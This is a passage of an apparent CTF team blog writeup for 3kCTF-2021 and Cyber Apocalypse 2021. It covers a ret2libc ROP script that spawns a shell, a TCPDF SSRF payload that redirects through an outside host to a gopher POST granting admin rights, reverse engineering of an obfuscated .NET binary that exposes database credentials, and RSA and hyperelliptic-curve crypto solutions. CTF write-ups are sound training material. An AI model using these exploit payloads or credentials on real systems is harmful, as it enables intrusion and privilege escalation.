hex(libc_base)) binsh = libc_base + next(libc.search(b\u0026#34;/bin/sh\u0026#34;)) # ret2libc syscall pop_rax = libc_base + 0x000000000004a550 pop_rdx = libc_base + 0x0000000000162866 pop_rsi = libc_base + 0x0000000000027529 syscall = libc_base + 0x000000000002584d payload = b\u0026#39;A\u0026#39;*40 payload += p64(pop_rax) payload += p64(0x3b) payload += p64(pop_rdi) payload += p64(binsh) payload += p64(pop_rdx) + p64(0) + p64(0) payload += p64(pop_rsi) + p64(0) payload += p64(syscall) p.sendlineafter(\u0026#39;\u0026gt;\u0026#39;,payload) p.interactive() ppaste (Web; 498 points) Solved by ozetta.\nWell, you only get 498 points instead of 500 points if you are the only solver.\nThe first part of this challenge is to get an account (otherwise you can't create a note a play with the PDF stuff).\n$checkInvite = @json_decode(@qInternal(\u0026#34;invites\u0026#34;,json_encode(array(\u0026#34;invite\u0026#34;=\u0026gt;$data[\u0026#39;d\u0026#39;][\u0026#39;invite\u0026#39;]))),true); My first thought was having a 512 depth array as the invitation code to corrupt the json_encode. But the input got a length limitation. After a while, our teammate apple has registered an account successfully with an unknown payload. For some unknown reason I cannot reproduce his payload. But anyway we tried the second part of the challenge, which is to exploit the TCPDF to leak the flag. But it is not very successful because the space in the title field was removed and the content is sanitized.\n$data[\u0026#39;d\u0026#39;][\u0026#39;title\u0026#39;] = preg_replace(\u0026#34;/\\s+/\u0026#34;, \u0026#34;\u0026#34;, $data[\u0026#39;d\u0026#39;][\u0026#39;title\u0026#39;]); // ... $html = \u0026#39;\u0026lt;h2\u0026gt;\u0026#39;.$tP[\u0026#39;title\u0026#39;].\u0026#39;\u0026lt;/h2\u0026gt;\u0026lt;br\u0026gt;\u0026lt;h2\u0026gt;\u0026#39;.str_repeat(\u0026#34;-\u0026#34;, 40).\u0026#39;\u0026lt;/h2\u0026gt;\u0026lt;pre\u0026gt;\u0026#39;.htmlentities($tP[\u0026#39;content\u0026#39;],ENT_QUOTES).\u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;; apple also tried the special tag \u0026lt;tcpdf\u0026gt;, which could be used for code execution10, but unfortunately it is not enabled by default.\nLet's review the first part. We managed to find some other payload that corrupts the JSON input in Python. Then I found that a sufficiently large number like 3e333 will result in INF in PHP, which is invalid in Python. But it could not be used to bypass the invitation code and apple found that it is because INF's string length is 3, which is less than 4 and fails in a checking condition.\nforeach ($data[\u0026#39;d\u0026#39;] as $key =\u0026gt; $value) { if(strlen($value)\u0026lt;4) puts(0); } Then we changed the payload to negative infinity like -3e333 and managed to bypass the restriction.\nFor the TCPDF part, we have to review the source code, which is unpleasantly long:\nhttps://raw.githubusercontent.com/the3000org/3kCTF2021/master/web/ppaste/source/www/TCPDF/tcpdf.php\nand my computer crashes when I view in Github directly. 🥳\nAnyway, the vulnerability is in the getHtmlDomArray function:\nprotected function getHtmlDomArray($html) { // array of CSS styles ( selector =\u0026gt; properties).  $css = array(); // get CSS array defined at previous call  $matches = array(); if (preg_match_all(\u0026#39;/\u0026lt;cssarray\u0026gt;([^\\\u0026lt;]*)\u0026lt;\\/cssarray\u0026gt;/isU\u0026#39;, $html, $matches) \u0026gt; 0) { if (isset($matches[1][0])) { $css = array_merge($css, json_decode($this-\u0026gt;unhtmlentities($matches[1][0]), true)); } $html = preg_replace(\u0026#39;/\u0026lt;cssarray\u0026gt;(.*?)\u0026lt;\\/cssarray\u0026gt;/isU\u0026#39;, \u0026#39;\u0026#39;, $html); } // extract external CSS files  $matches = array(); if (preg_match_all(\u0026#39;/\u0026lt;link([^\\\u0026gt;]*)\u0026gt;/isU\u0026#39;, $html, $matches) \u0026gt; 0) { foreach ($matches[1] as $key =\u0026gt; $link) { $type = array(); if (preg_match(\u0026#39;/type[\\s]*=[\\s]*\u0026#34;text\\/css\u0026#34;/\u0026#39;, $link, $type)) { $type = array(); preg_match(\u0026#39;/media[\\s]*=[\\s]*\u0026#34;([^\u0026#34;]*)\u0026#34;/\u0026#39;, $link, $type); // get \u0026#39;all\u0026#39; and \u0026#39;print\u0026#39; media, other media types are discarded  // (all, braille, embossed, handheld, print, projection, screen, speech, tty, tv)  if (empty($type) OR (isset($type[1]) AND (($type[1] == \u0026#39;all\u0026#39;) OR ($type[1] == \u0026#39;print\u0026#39;)))) { $type = array(); if (preg_match(\u0026#39;/href[\\s]*=[\\s]*\u0026#34;([^\u0026#34;]*)\u0026#34;/\u0026#39;, $link, $type) \u0026gt; 0) { // read CSS data file  $cssdata = TCPDF_STATIC::fileGetContents(trim($type[1])); if (($cssdata !== FALSE) AND (strlen($cssdata) \u0026gt; 0)) { $css = array_merge($css, TCPDF_STATIC::extractCSSproperties($cssdata)); } } } } } } Interestingly, the parsing for the link tag \u0026lt;link type=\u0026quot;text/css\u0026quot; href=\u0026quot;somefile.css\u0026quot;\u0026gt; does not require the space in between. So \u0026lt;linktype=\u0026quot;text/css\u0026quot;href=\u0026quot;somefile.css\u0026quot;\u0026gt; also works. And TCPDF_STATIC::fileGetContents will call curl eventually:\nhttps://github.com/the3000org/3kCTF2021/blob/13d2e0cbc694da51d31339166ee2182665586381/web/ppaste/source/www/TCPDF/include/tcpdf_static.php#L1898\nGreat we got SSRF! The payload to verify it is \u0026lt;linktype=\u0026quot;text/css\u0026quot;href=\u0026quot;http://webhook\u0026quot;\u0026gt;. You should see the User-Agent is tc-lib-file.\nThen I try to leak the information downloaded as a part of CSS, which will be stored in a special tag \u0026lt;cssarray\u0026gt; later. It looks possible to leak the flag because of the flag format:\n\nLater we found that there is a function in the internal service to set a user's privilege to admin:\n@app.route(\u0026#39;/users\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def users(): if request.method == \u0026#39;POST\u0026#39;: myJson = json.loads(request.data) if(myJson[\u0026#39;user\u0026#39;]): qDB(\u0026#34;UPDATE users SET priv=not(priv) WHERE user=? \u0026#34;,\u0026#34;setAdmin\u0026#34;,myJson[\u0026#39;user\u0026#39;]) return json.dumps(True) else: return json.dumps(False) return json.dumps(qDB(\u0026#34;SELECT user,priv FROM users\u0026#34;)) But it requires POST... After a while I found the curl used before will accept redirection:\nhttps://github.com/the3000org/3kCTF2021/blob/13d2e0cbc694da51d31339166ee2182665586381/web/ppaste/source/www/TCPDF/include/tcpdf_static.php#L1969\nSo we can use the redirect trick to SSRF a gopher to POST in internal service. Then I spent some significant time to handcraft the payload and got it wrong several times because of the encoding issue 🙈.\nAnyway here is the final payload to put in the note's title:\n\u0026lt;linktype=\u0026#34;text/css\u0026#34;href=\u0026#34;http://poc.mm2.in/302.php?1=gopher%3A%2F%2F127.0.0.1%3A8082%2F_POST%2520%2Fusers%2520HTTP%2F1.1%250d%250aContent-type%3A%2520application%2Fjson%250d%250aContent-length%3A%252019%250d%250aHost%3A%2520127.0.0.1%3A8082%250d%250a%250d%250a%7B%22user%22%3A%22USERNAME%22%7D%250d%250a\u0026#34;\u0026gt; Then generate a pdf for this note will trigger SSRF, and then visit the admin page will get the flag.\n3K_SIGNER (Web; 495 points) Solved by ozetta.\nThis challenge got a lot of unpleasant API calls. So I write some fetches:\n// Registration fetch(\u0026#39;/register\u0026#39;,{method:\u0026#39;POST\u0026#39;,headers:{\u0026#39;Content-type\u0026#39;:\u0026#39;application/json\u0026#39;},body:JSON.stringify( {name:\u0026#34;1\u0026#34;,password:\u0026#34;2\u0026#34;} )}).then(x=\u0026gt;x.text()).then(x=\u0026gt;console.log(x)) // Login fetch(\u0026#39;/login\u0026#39;,{method:\u0026#39;POST\u0026#39;,headers:{\u0026#39;Content-type\u0026#39;:\u0026#39;application/json\u0026#39;,\u0026#39;Authorization\u0026#39;:\u0026#39;Basic \u0026#39;+btoa(\u0026#39;1:2\u0026#39;)},body:JSON.stringify( {name:\u0026#34;1\u0026#34;,password:\u0026#34;2\u0026#34;} )}).then(x=\u0026gt;x.text()).then(x=\u0026gt;console.log(x)) // Call API with token fetch(\u0026#39;/users\u0026#39;,{method:\u0026#39;GET\u0026#39;,headers:{\u0026#39;Content-type\u0026#39;:\u0026#39;application/json\u0026#39;,\u0026#39;Authorization\u0026#39;:\u0026#39;Basic \u0026#39;+btoa(\u0026#39;1:2\u0026#39;),\u0026#39;x-access-tokens\u0026#39;:\u0026#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwdWJsaWNfaWQiOiJmZmZkYzgzOS01YzJhLTQ1OTMtYWUxMy01Mzk1YjNNjYwODciLCJleHAiOjE2MjExMzczNDN9.mceCURiA0IuRWfVbgxvfYvSKgmLQDC-Di0DE1mzBdsQ\u0026#39;}}).then(x=\u0026gt;x.text()).then(x=\u0026gt;console.log(x)) The objective is to call sign_pdf to trigger unoconv. But how to get a signed token without admin right? Mystiz got a good eyesight on the checking function instead:\nreg = re.compile(\u0026#34;[0-9a_f]{32}\\Z\u0026#34;, re.I) def check_valid_token(intoken): if bool(reg.match(intoken)): rez=Tokens.query.filter(Tokens.token.ilike(intoken)).first() print(rez) if rez: return True else: return False else: return False For some unknown reason it uses case-insensitive like for checking and the regular expression contains _. So '_'*32 would be a valid token.\nNow we can play with the converter. This is similar to my previous challenges LibVOrifice and Conversion Center. Apparently the old payload =WEBSERVICE() did not work. To exploit unoconv we can refer to this more recent research11. The Postscript payload seems not working, but the OLE Object xLinking works well.\nI later on found that the CTF was ending soon (less than 30 minutes left) after I solved the challenge. That makes me look like flag hoarding, but no 🤫.\n\nOur teammates were working on Password Manager, and almost got the flag (missed one character). When they saw the bot message they thought their challenge was solved, but no 😒.\nPassword Manager (Reverse; 493 points) Solved by Mystiz, harrier and cdemirer.\nWe are given an archive file with password_manager.exe, log.dat and a bunch of .dll files. As a slightly seasoned reverse engineer, we knew password_manager.exe is the file the challenge. harrier searched about the .dlls online and found Renci.SshNet.dll is a .NET library for SSH - which he implied that the binary is written in .NET.\nPart I. Getting Started Since no one is working on this challenge, I decided to have a try on the challenge because I think .NET is not difficult to play with. To begin, I spun up my dusted Windows machine and load the binary with dnSpy. The taskQuals namespace caught my attention. For example, this is part of the eval_c inside the namespace:\n// Token: 0x0600002C RID: 44 RVA: 0x00003F10 File Offset: 0x00002110 private void eval_c(object A_0, EventArgs A_1) { int a_ = 14; short num = (short)1021706240; int num2 = (int)num; switch (num2) { default: { num = (short)2018443264; // Omitted...  for (;;) { // Omitted...  switch (num2) { // Omitted...  case 15: { string text4 = Form1.b(\u0026#34;鯇迉胋词鏏蛑ﳕ볙껛뇝跟싡\u0026#34;, a_); char value3; text4 = text4 + Conversions.ToString(value3) + Form1.b(\u0026#34;\u0026#34;, a_); MySqlCommand mySqlCommand = new MySqlCommand(text4, mySqlConnection); text += Convert.ToString(RuntimeHelpers.GetObjectValue(mySqlCommand.ExecuteScalar())); num = (short)1661272070; num2 = (int)((IntPtr)num); continue; } // Omitted...  } IL_24B: text5 = Form1.b(\u0026#34;꫇ꯉ꿋꫍뗏듑돓뻕뇗냙럛닝跟賡诣雥駧飩鿫髭藯蓱菳軵臷胹뷻볽䏿䘁䄃䀅伇䈉䔋䐍嬏帑夓堕圗䨙䴛䰝猟瘡焣瀥缧爩甫琭\u0026#34;, a_); text2 = Form1.b(\u0026#34;﯉ﻋ﷍﷛﷝쓟쟡싣쳥엧쇩싫틭컯쿱듳짵\u0026#34;, a_); dictionary = new Dictionary\u0026lt;string, string\u0026gt;(); dictionary.Add(Form1.b(\u0026#34;\u0026#34;, a_), Form1.b(\u0026#34;\u0026#34;, a_)); dictionary.Add(Form1.b(\u0026#34;\u0026#34;, a_), Form1.b(\u0026#34;\u0026#34;, a_)); // Omitted...  dictionary.Add(Form1.b(\u0026#34;\u0026#34;, a_), Form1.b(\u0026#34;\u0026#34;, a_)); dictionary.Add(Form1.b(\u0026#34;裇\u0026#34;, a_), Form1.b(\u0026#34;難\u0026#34;, a_)); string connectionString = Form1.b(\u0026#34;믇꿉뻋룍뗏ꃑ헟쳡틣헥웧틩퓫헭藯臱釳蓵엷釹駻賽狿洁㼃戅椇縉洋氍焏愑焓⬕猗缙眛┝借䴡嘣別ᔧᤩἫḭدऱ䐳圵䬷䤹䬻儽㈿♁祃ⵅⵇ㡉㹋⅍歏\u0026#34;, a_); mySqlConnection = new MySqlConnection(connectionString); mySqlConnection.Open(); string text6 = this.input.Text; // Omitted...  } return; IL_B0: value2 = Form1.b(\u0026#34;诇韛볋韍뷏\u0026#34;, a_); num = (short)185991170; num2 = (int)((IntPtr)num); goto IL_59; } } } It seemed to me that the program is obfuscated in a similar way Layer did - num2 is the state and it controls the code block to be executed by switch. There are some interesting snippets, for instance, the below snippet should result in connecting to a MySQL database:\nstring connectionString = Form1.b(\u0026#34;믇꿉뻋룍뗏ꃑ헟쳡틣헥웧틩퓫헭藯臱釳蓵엷釹駻賽狿洁㼃戅椇縉洋氍焏愑焓⬕猗缙眛┝借䴡嘣別ᔧᤩἫḭدऱ䐳圵䬷䤹䬻儽㈿♁祃ⵅⵇ㡉㹋⅍歏\u0026#34;, a_); mySqlConnection = new MySqlConnection(connectionString); mySqlConnection.Open(); As suggested, the gibberish inside Form1.b should represent a connection string. Let's look at the function.\nPart II. What is Form1.b hiding? // Token: 0x06000039 RID: 57 RVA: 0x00005844 File Offset: 0x00003A44 internal static string b(string A_0, int A_1) { char[] array = A_0.ToCharArray(); int num = (int)((IntPtr)(1681160370 + A_1) + (IntPtr)15 + (IntPtr)52 + (IntPtr)59 + (IntPtr)39 + (IntPtr)98); int num3; int num2; if ((num2 = (num3 = 0)) \u0026lt; 1) { goto IL_6A; } IL_37: int num5; int num4 = num5 = num2; char[] array2 = array; int num6 = num5; char c = array[num5]; byte b = (byte)((int)(c \u0026amp; 0xff) ^ num++); byte b2 = (byte)((int)(c \u0026gt;\u0026gt; 8) ^ num++); byte b3 = b2; b2 = b; b = b3; array2[num6] = (ushort)((int)b2 \u0026lt;\u0026lt; 8 | (int)b); num3 = num4 + 1; IL_6A: if ((num2 = num3) \u0026gt;= array.Length) { return string.Intern(new string(array)); } goto IL_37; } The above C# code has the same logic to the below Python function. Hence, we are able to decode the strings they obfuscated.\ndef form_a(x, b): offset = b+185 output = [] for j, xc in enumerate(x): output.append(((ord(xc)\u0026gt;\u0026gt;8) ^ (offset+2*j+1)) \u0026amp; 0xff) return bytes(output).decode() For example, the connection string they used to connect to the MySQL server is decoded into below. We are now able to connect to the database ourselves!\nserver=159.65.63.88;user=kerro;database=kek;port=3306;password=kerro; Part III. Database-as-a-Encryption Service After connected to the database, I found that there are 52 tables, namely, a, b, ..., z, A, B, ..., Z. Interestingly, there is only one row in each of the tables. For example,\nmysql\u0026gt; select * from a; +------+ | cont | +------+ | e | +------+ 1 row in set (0.24 sec) mysql\u0026gt; select * from b; +------+ | cont | +------+ | f | +------+ 1 row in set (0.18 sec) It looks like a rotation on characters. From my sampled queries, I guess their corresponding input-output pairs are:\nINPUT | abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ OUTPUT | efghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$% They are added to the dictionary. There are a number of key-value pairs being added to the dictionary. These are the pairs in the dictionary:\nINPUT | abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%\u0026amp;*-+.\u0026lt;\u0026gt;=@?0123456789 OUTPUT | efghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%\u0026amp;*-+.\u0026lt;\u0026gt;=@?0123456789abcd After all, it is a ROT-4 cipher in the given character set - and the database is served as a part of the encryption mapping.\nWhere is this used? We will see.  Part IV. Recovering the additional binaries From the code, we have traces about a new binary is constructed and written to file1.exe:\nbinary_1 = new byte[] { 77, 90, 144, 0, 3, /* ...omitted... */ 116, 32, 98, 101 }; binary_2 = File.ReadAllBytes(\u0026#34;./log.dat\u0026#34;); byte[] final_array = binary_1.Concat(binary_2).ToArray\u0026lt;byte\u0026gt;(); global::eval_c.eval_a.FileSystem.WriteAllBytes(\u0026#34;./file1.exe\u0026#34;, final_binary, true); Since log.dat is attached, we are able to reconstruct file1.exe ourselves. There is a curious function in file1.exe when opened with IDA Pro: sub_1400013F0. It is a huge function, but most of the operations are simply value assignments:\nint __cdecl sub_1400013F0(int argc, const char **argv, const char **envp) { FILE *File; // ST20_8  char Str; // [rsp+30h] [rbp-186B8h]  char v6; // [rsp+31h] [rbp-186B7h]  char v7; // [rsp+32h] [rbp-186B6h]  char v8; // [rsp+33h] [rbp-186B5h]  // Omitted  Str = 77; v6 = 90; v7 = -112; v8 = 0; v9 = 3; // Omitted  v16384 = 0; v16385 = 0; v16386 = 0; v16387 = 0; v16388 = 0; memset(\u0026amp;v16389, 0, 83616ui64); File = fopen(\u0026#34;file.exe\u0026#34;, \u0026#34;wb\u0026#34;); fwrite(\u0026amp;Str, 1ui64, 0x4000ui64, File); fclose(File); sub_140001000(\u0026#34;./file.exe\u0026#34;); return 0; It is pretty evident that there is another binary called file.exe, and we are able to build it from the above source code.\nPart V. Microsoft's Cryptographic Provider We are given the key the3kctfteamftw!! and 29 bytes of the ciphertext:\n5b d6 a5 3f f2 17 88 ed 47 d7 2c a1 a4 5e ff e7 e6 06 8c 99 a1 99 ee 6e 6f f8 4a b4 2c The cryptographic details in file.exe is pretty hairy. Since it is using Microsoft Enhanced RSA and AES Cryptographic Provider and there are no documentation, I don't know how did they derive the AES-key from the 17-byte seed key, nor the mode of operation they used. The only thing I knew is they used SHA256 to derive the AES-key and encrypt with AES128.\nHowever, I recalled that there is a challenge in Cyber Apocalypse 2021 that used Microsoft's API with SHA256 and AES128 too. Maybe we can refer to the write-ups? harrier referred me to the write-up12 that contain its Python implementation. Well... I better assume that is a black-box and modify the source code to fit my goal... Wait, what is it?\nPart VI. Understanding the Objective From file.exe, the objective is to find a message such that its the first 29 bytes of the ciphertext is given as 5b d6 a5 ... 4a b4 2c as specified above.\nNote. The code has an different checking condition checks if target_c[0] ^ c[0] ^ target_c[1] ^ c[1] ^ ... = 0. However, this loose condition is also enforced in the author\u0026rsquo;s remaining challenges Crackme and Layers. I think it is safe to assume that the real intention is target_c[i] == c[i] for all i\u0026rsquo;s\u0026hellip;  The ciphertext comes from the clipboard, which is overwritten in password_manager.exe. There is an input box in the password manager. To copy something to the clipboard, one must have C0pYm3 copied in the clipboard. Otherwise the password manager will be closed. After that, the content in the input box will be encrypted with the ROT-4 cipher we mentioned in part III and will be copied to the clipboard. Hence, our objective is to find password that satisfies the below condition.\nAES128(ROT4(password), key)[:29] == target_ciphertext Since it is hard for me to switch to my Windows machine, I decide to patch the script and send it to harrier for me to run. There are some bugs and cdemirer helped fixing. Eventually, we are able to get it working. There are multiple candidates for the password. The most reasonable one is AsIOnc3Said!F4ceb00KIs3viL!=# - and we have the flag 20 minutes before the CTF ends!\n3k{AsIOnc3Said!F4ceb00KIs3viL!=#}  https://en.wikipedia.org/wiki/Rabin_cryptosystem#Decryption [return] https://www.w3.org/TR/REC-png-961001 [return] https://twitter.com/codexgigassys/status/765743255917125632 [return] https://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm [return] http://factordb.com/index.php?id=1100000002583673291 [return] https://www.alpertron.com.ar/ECM.HTM [return] http://factordb.com/index.php?id=1100000002583690582 [return] http://factordb.com/index.php?id=1100000002583705568 [return] http://factordb.com/index.php?id=1100000002583719246 [return] https://tcpdf.org/examples/example_049/ [return] https://buer.haus/2019/10/18/a-tale-of-exploitation-in-spreadsheet-file-conversions/ [return] https://ctftime.org/writeup/27932 [return]   ","permalink":"https://b6a.black/posts/2021-05-22-3kctf/","summary":"We are united to play 3kCTF-2021 and result in the second place. In this blog post, we will walk through our solutions on the challenges solved.","title":"3kCTF-2021 Writeup"},{"content":"We played Cyber Apocalypse 2021 and I have attempted several crypto challenges. I'll include the challenges Wii Phit and Hyper Metroid in this writeup.\nWii Phit  The aliens have encrypted our save file from Wii Phit and we’re about to lose our 4,869 day streak!! They’re even taunting us with a hint. I think the alien’s are getting a bit over-confident if you ask me.\n CHALLENGE from Crypto.Util.number import bytes_to_long from secrets import FLAG,p,q N = p**3 * q e = 0x10001 c = pow(bytes_to_long(FLAG),e,N) print(f\u0026#39;Flag: {hex(c)}\u0026#39;) # Hint w = 25965460884749769384351428855708318685345170011800821829011862918688758545847199832834284337871947234627057905530743956554688825819477516944610078633662855 x = p + 1328 y = p + 1329 z = q - 1 assert w*(x*z + y*z - x*y) == 4*x*y*z Challenge Analysis Well... The code is pretty simple. It is just importing the number $p$ and $q$, and perform RSA encryption on the flag. Although the public key $N \\neq pq$ as textbook RSA, it won’t be a big problem as we could still find it’s totient function $\\varphi$ easily and calculate it’s private key $d$ if we could find $p$ and $q$.\nSo here’s the question, how could we find $p$ and $q$? Let’s see the hint.\nFinding $p$ and $q$ We could see that the hint gives us four variables, $w$, $x$, $y$ and $z$, where all of them are either in terms of $p$, $q$ and some constant. The program then asserts that:\n\\[w(xz + yz - xy) = 4xyz\\]\nSo lets expand it and make it become a multivariable equation in terms of $p$ and $q$ (and constant $w$):\n\\[ \\begin{aligned} f(p, q) = \u0026-4p^2q - (w-4)p^2 + (2w-10628)pq\\\\ \u0026\\quad-(2659w-10628)p + (2657w-7059648)q - (1767569w-7059648)\\\\ =\u0026\\ 0 \\end{aligned} \\]\nWell it seems so complicated... To be honest, I had no idea what I should do next when I expanded the equation like this. I had tried various methods such as making it into modular equations. But of course as expected, it didn’t work.\nWhen I was struggling with this equation, I suddenly noticed that there are only 2 positive terms in this equation, while the remaining 4 terms are negative terms. More importantly, by observing the degree of each terms, it seems that it's always likely that $f(p, q)$ will be negative no matter what $p$ and $q$ are. Therefore, I suspect that the maximum value of $f(p, q)$ would be 0 actually.\nSo lets assume $f(p_0, q_0)$ be the maximum point of $f(p, q)$. Then we can do partial differentiation on $f(p, q)$ to find out $p_0$ and $q_0$.\n\\[ \\begin{gathered} \\tfrac{\\partial f}{\\partial p} =-8pq - (2w-8)p + (2w-10628)q-(2659w-10628)\\\\ \\tfrac{\\partial f}{\\partial q} =-4p^2 + (2w-10628)p + (2657w-7059648) \\end{gathered} \\]\nFor maximum point, $f_p = 0$ and $f_q = 0$. It's difficult to solve $f_p$ as it's still having 2 variables. However, $f_q$ now remains $p$ as the only term as a quadratic equation! So we are able to solve for $p_0$!\nDoes the quadratic equation has real positive integer root? Yes! Here's the value of $p_0$:\np_0 = 12982730442374884692175714427854159342672585005900410914505931459344379272923599916417142168935973617313528952765371978277344412909738758472305039316830099 So let's plug the value of $p_0$ to $f_p = 0$, then we can solve for $q_0$:\nq_0 = 4376511920801673769046982367789644084746600661635151104602579081967083768976309788885633491753761209012042953502416064276555378570438196809829053232168930363213412874907199642703512833211163084612185095343783021125928854760406110492494016250237689683218940269389627326164130063600050024089561671913076715913062539181517022517918888557966172136200366952844819842691032260278270002343732370611629511112677638724984890716752906711541254394792207074699964511035503381 Finally, we use the value of $p_0$ and $q_0$ to check whether $w(xz + yz - xy) = 4xyz$ and it fits the equation! So the maximum point of $f(p, q)$ is really 0 and we have successfully retrive $p$ and $q$.\nThen the rest is easy. For textbook RSA, the totient function $\\varphi(pq) = (p-1)(q-1)$. In this case, the public key is not $pq$ but $p^3q$, so the totient function would be\n\\[\\varphi(p^3q) = p^2(p-1)(q-1).\\]\nThen we can get the private key $d$ like textbook RSA. Using the private key $d$, we could decrypt the flag. Flag: CHTB{Erdos-Straus-Conjecture}\nMe: Erdos-Straus-Conjecture? What is that?\nHyper Metroid  Dropping a morph ball bomb, Samus cracked open the floor and dropped down into the guts of Phaaze. At the end of the tunnel is a locked chest containing the hyper beam upgrade. Samus found the encrypted key preserved in a ball of glowing biomass, but can’t decode it. Help Samus capture the flag so she can eradicate the alien invasion once and for all.\n CHALLENGE from secrets import flag def alien_prime(a): p = (a^5 - 1) // (a - 1) assert is_prime(p) return p def encrypt_flag(): e = 2873198723981729878912739 Px = int.from_bytes(flag, \u0026#39;big\u0026#39;) P = C.lift_x(Px) JP = J(P) return e * JP def transmit_point(P): mumford_x = P[0].list() mumford_y = P[1].list() return (mumford_x, mumford_y) a = 1152921504606846997 alpha = 1532495540865888942099710761600010701873734514703868973 p = alien_prime(a) FF = FiniteField(p) R.\u0026lt;x\u0026gt; = PolynomialRing(FF) h = 1 f = alpha*x^5 C = HyperellipticCurve(f,h,\u0026#39;u,v\u0026#39;) J = C.jacobian() J = J(J.base_ring()) enc_flag = encrypt_flag() print(f\u0026#39;Encrypted flag: {transmit_point(enc_flag)}\u0026#39;) #Encrypted flag: ([1276176453394706789434191960452761709509855370032312388696448886635083641, 989985690717445420998028698274140944147124715646744049560278470410306181, 1], [617662980003970124116899302233508481684830798429115930236899695789143420, 429111447857534151381555500502858912072308212835753316491912322925110307]) The missing piece In the challenge, we are given a hyperelliptic curve $\\mathcal{C}$, a constant $e$ and a point $Q$ (the encrypted flag). The objective is to find the point $P$ such that $Q = eP$. Similar to elliptic curves and modular exponentation, we are able to compute the inverse of $e$ to compute $P$ once we have the order of the field.\nThe missing piece of this puzzle is the order of the Jacobian, $\\#J(\\mathcal{C})$ and there is no efficient algorithm to calculate it generally. That means, this hyperelliptic curve $\\mathcal{C}$ must be some special case so that we could caluclate its $\\#J(\\mathcal{C})$ easily.\nUsing my superior OSINT skills, I was able to find this special case in section 4.3.1 in A Comparison of Point Counting methods for Hyperelliptic Curves over Prime Fields and Fields of Characteristic 21.\nAs the same case mentioned in the paper, the prime $p$ generated in this challenge is a generalised Mersenne Prime (in a form of $\\frac{a^5-1}{a-1}$) and $\\alpha$ is also chosen such that\n\\[\\alpha^{(p-1)/5} \\equiv a\\ (\\text{mod}\\ p).\\]\nThis is exactly what we want and we could find out $\\#J(\\mathcal{C})$ in this challenge if we follow the paper!\nBut wait... multiplicative map?... automorphism?... What is $\\zeta$? Oh, it's roots of unity, ...what is that?\nI don't have much knowledge on mathematics that I totally can't understand what's the paper saying. Therefore, I found Mystiz in order to help but it seems that he can't understand the exact steps too... We then stucked there for about one and a half day just because we don't understand the mathematics in the paper.\nCryptosint In the paper, the author gave an example of the Mersenne Prime method and calculated the $\\#J(\\mathcal{C})$ in that example. However, it doesn't show the steps in the example. By skimming the paper, I suddenly noticed that at the end of the paper, the author stated that all code used for the paper is available at the website2. Unfortunately, the paper is published in 2004 and the webpage has disappeared already.\nUsing my superior OSINT skills again. As I think that the website is an university website, it's having a high probability that it's being archived on the Internet. Therefore, I used Wayback Machine and I successfully found that webpage3 and I could even download the source code!\nI then open the C source code on calculating the Mersenne Prime method and changed it to sage.\ndef calculateJacobiSum(a, genus, n): kth_root = 0 index = 0 temp_array = [None] * n jacobi = [None] * n \u0026#34;\u0026#34;\u0026#34; Evaluate the +/- \\sigma^k part of the Jacobi sum This is only for genus 2 and 3 curves Maybe replace this by a formula later \u0026#34;\u0026#34;\u0026#34; modu = a % n if genus == 2: if modu == 0: kth_root = -1 elif modu == 2: kth_root = -4 elif modu == 3: kth_root = 2 elif modu == 4: kth_root = 3 else: kth_root = 0 else: if modu == 0: kth_root = 4 elif modu == 2: kth_root = -3 elif modu == 3: kth_root = -5 elif modu == 4: kth_root = 1 elif modu == 5: kth_root = -6 elif modu == 6: kth_root = 2 else: kth_root = 0 #Calculate rest of jacobi sum if genus == 2: temp_array[0] = a*a temp_array[1] = -a temp_array[2] = 0 temp_array[3] = -a temp_array[4] = 1 else: temp_array[0] = a*a*a temp_array[1] = -a*a temp_array[2] = a temp_array[3] = -1 temp_array[4] = -a*a temp_array[5] = a - (a*a) temp_array[6] = a #Now multiply by kth_root for i in range(n): index = (abs(kth_root) + i) % n jacobi[index] = temp_array[i] if kth_root \u0026lt; 0: jacobi[index] *= -1 return jacobi def evaluateOrderTwists(jacobi, i, j, n): twist = 0 order = [None] * (n - 1) roots_unity = [None] * n #Calculate roots of unity that are needed roots_unity[0] = 1 for k in range(1, n): real_part = cos((2*k*pi)/n) imag_part = sin((2*k*pi)/n) roots_unity[k] = real_part + imag_part*I #Add in the \u0026#34;twist\u0026#34; to the jacobi sum twist = pow(-1, i) jacobi[j] = jacobi[j] + twist; print(\u0026#34;twist: \u0026#34; + str(twist)) order[0] = 0 #Evaluate first iteration for k in range(n): order[0] += (jacobi[k] * roots_unity[k]) #Evaluate norm of jacobi sum (and twist) for k in range(2, n): jac2 = [None] * n index = 0 jac2[0] = jacobi[0] #Bump all the roots of unity up by the \u0026#34;k-th\u0026#34; power for l in range(1, n): index = (l * k) % n jac2[index] = jacobi[l] order[k-1] = 0 #Evaluate k-th iteration for l in range(n): order[k-1] += (jac2[l] * roots_unity[l]) #Find the total order of the jacobian total_order = order[0] * order[1] * order[2] * order[3] return total_order.real() You ask me that is the i and j in evaluateOrderTwists? I don't know either. Maybe let's just follow the input of the example in the webpage.\nTherefore, by running the code above in sage, I've successfully found the order of the jacobian.\n#J(C) = 3121748550315992691688089417819100427615767189940196696753029154066816327228360361217733781238925753559457441594415001909435541252098381221684880 Then the remaining thing is lift the encrypted flag point onto the jacobian, and multiply it by the inverse to get back the original flag point. Then we could get the flag.\nHere's the solve script:\ndef alien_prime(a): p = (a^5 - 1) // (a - 1) assert is_prime(p) return p def calculateJacobiSum(a, genus, n): kth_root = 0 index = 0 temp_array = [None] * n jacobi = [None] * n \u0026#34;\u0026#34;\u0026#34; Evaluate the +/- \\sigma^k part of the Jacobi sum This is only for genus 2 and 3 curves Maybe replace this by a formula later \u0026#34;\u0026#34;\u0026#34; modu = a % n if genus == 2: if modu == 0: kth_root = -1 elif modu == 2: kth_root = -4 elif modu == 3: kth_root = 2 elif modu == 4: kth_root = 3 else: kth_root = 0 else: if modu == 0: kth_root = 4 elif modu == 2: kth_root = -3 elif modu == 3: kth_root = -5 elif modu == 4: kth_root = 1 elif modu == 5: kth_root = -6 elif 